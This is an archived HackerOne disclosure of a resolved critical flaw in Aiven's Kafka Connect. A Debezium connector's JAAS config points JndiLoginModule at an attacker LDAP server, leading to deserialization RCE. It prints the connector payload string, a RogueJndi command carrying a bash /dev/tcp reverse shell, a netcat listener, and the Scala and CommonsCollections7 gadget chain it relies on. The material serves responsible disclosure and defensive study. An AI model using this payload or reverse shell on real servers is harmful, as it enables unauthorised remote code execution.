---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/deserialization-of-untrusted-data
  - env/web
  - vuln/deserialization
  - impact/rce
substate: "resolved"
weakness: "Deserialization of Untrusted Data"
enriched: true
body: true
date: 2022-11-08
submitted: 2022-04-04T09:56:31.884Z
bounty_usd: 5000
votes: 45
cve: []
program: "[[programs/aiven_ltd|Aiven Ltd]]"
reporter: "jarij"
source: "https://hackerone.com/reports/1529790"
title: "Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration"
---
# Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration

> **Severity:** Critical | **Bounty:** 5,000 USD | **Votes:** 45 | **Program:** Aiven Ltd | **Disclosed:** 2022-11-08

- Report: [https://hackerone.com/reports/1529790](https://hackerone.com/reports/1529790)
- CWE: Deserialization of Untrusted Data
- Submitted: 2022-04-04T09:56:31.884Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too.  By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server.

## Steps To Reproduce:
██████

  1. Login into my VPS:  `ssh ███████`, password: `█████`
  1. Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"`
  1. Execute `nc -nlvp 4445` on another tab
  1. Execute `python3 poc.py` on another table. This poc script launches the exploit against my Aiven kafka connect instance.
  1. Reverse shell connection should now be established


## The gadget chain

The exploit uses `System.setProperty` gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala version 2.13.6. It may fail on other scala versions. Then the script executes the reverse shell setup command using the [CommonsCollections7](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java) payload.

## Impact

Attacker can execute commands on the server and access other resources on the network.

## Timeline

- **Report Filed**
- **2022-04-05** @stefan_arentz: Thank you @jarij we are actively investigating/verifying this report.
- **2022-04-06** @jarij: Thanks, @stefan_arentz! Let me know if you need more information about this
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
